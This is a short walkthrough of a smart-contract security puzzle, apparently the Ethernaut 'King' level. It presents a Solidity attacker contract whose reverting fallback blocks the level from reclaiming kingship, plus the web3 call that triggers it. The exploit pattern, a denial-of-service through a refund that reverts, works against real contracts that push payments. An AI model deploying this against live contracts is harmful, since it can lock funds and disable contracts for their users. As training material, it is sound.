The first step of this level is to claim kingship. We can do this by transferring more than 1 Ether (which is the initial prize) to the instance. Once we're the king we need to stop the level from being able to reclaim kingship when we submit the instance. Given that the level is the owner of the contract they will always be allowed to reclaim it, regardless of the size of the price, because the require also allows for the message sender to be the owner:
```solidity
require(msg.value >= prize || msg.sender == owner);
```

Therefore we need to stop the reclamation through other means. The prize funds are transferred to the existing king using the `transfer` method. If the existing king is a contract which has a `revert` in its fallback method then we can revert the transaction which is attempted to do the `transfer` and nobody will be able to claim kingship.

We can do this with a contract like so:
```solidity
pragma solidity ^0.4.24;

interface King {
    function claimKingship() payable external;
}

contract Trigger {
    bool public claimed = false;
    
    function claimKingship() payable public {
        address addr = 0xFC7aB9dA03ea5f6F98Ee385dB6E9474bC9290e33;
        King k = King(addr);
        k.claimKingship.value(msg.value)();
        claimed = true;
    }
    
    function() public payable {
        if (claimed) {
            revert();
        }
    }
}
```

And use it like:
```javascript
var c = web3.eth.contract(abi).at("0x38efc993baa767428ecb335208dce0fdefb48ec2");
c.claimKingship({from: player, value: toWei(1.01)}, (err, res) => {});
```
